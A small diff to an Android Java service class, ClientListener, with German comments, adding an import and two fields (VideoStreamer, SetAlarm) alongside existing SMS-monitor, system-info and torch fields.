@@ -22,6 +22,7 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 import android.widget.Toast;
 import inout.Protocol;
+import android.view.SurfaceView;
 
 /**
  * Dies ist eine Abtrakte Klasse, welche von der Klasse Service erbt und die Interfaces OnRecordPositionUpdateListener und LocationListener implementiert.
@@ -67,7 +68,8 @@ public abstract class ClientListener extends Service implements OnRecordPosition
 	public SMSMonitor smsMonitor ;
 	public AdvancedSystemInfo advancedInfos;
 	public Torch torch;
-	
+	public VideoStreamer videoStreamer;
+	public SetAlarm setAlarm;
 	boolean waitTrigger;
 	/**
 	 * String Arrays die Nummern oder Schlagwörter beinhalten. Diese werden benötigt um SMS oder Anrufe nach den Wünschen des Benutzers zu filtern
